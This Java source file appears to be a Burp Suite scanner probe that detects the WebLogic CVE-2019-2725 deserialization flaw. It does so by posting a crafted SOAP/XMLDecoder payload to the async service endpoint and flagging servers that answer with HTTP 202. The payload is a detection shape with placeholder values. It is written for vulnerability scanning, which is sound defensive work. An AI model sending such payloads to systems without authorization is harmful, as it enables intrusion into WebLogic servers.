package probes;

import burp.*;

import java.util.Base64;

public class CVE_2019_2725 extends Probe {
    private static final String NAME = "CVE-2019-2725";
    private static final String SEVERITY = "High";
    private static String detail = "WebLogic has a deserialization vulnerability in XMLDecoder, you can send payload to target server via SOAP protocol!";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        String targetPath = "/_async/AsyncResponseService";
        // 无回显payload
        String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n" +
                "<soapenv:Header>\n" +
                "<wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" +
                "<void class=\"POC\">\n" +
                "<array class=\"xx\" length=\"0\">\n" +
                "</array>\n" +
                "<void method=\"start\"/>\n" +
                "</void>\n" +
                "</work:WorkContext>\n" +
                "</soapenv:Header>\n" +
                "<soapenv:Body>\n" +
                "<asy:onAsyncDelivery/>\n" +
                "</soapenv:Body>\n" +
                "</soapenv:Envelope>";
        // todo: 特定版本回显

        // post request
        IHttpRequestResponse checkReqResp = sendSOAP(requestResponse, targetPath, payload);
        String respText = Utilities.helpers.bytesToString(checkReqResp.getResponse());

        if (Utilities.getStatus(checkReqResp) == 202) {
            detail = detail + "<br/><br/>" + respText;
            return new WebLogicIssue(checkReqResp, NAME, detail, SEVERITY);
        } else return null;
    }
}
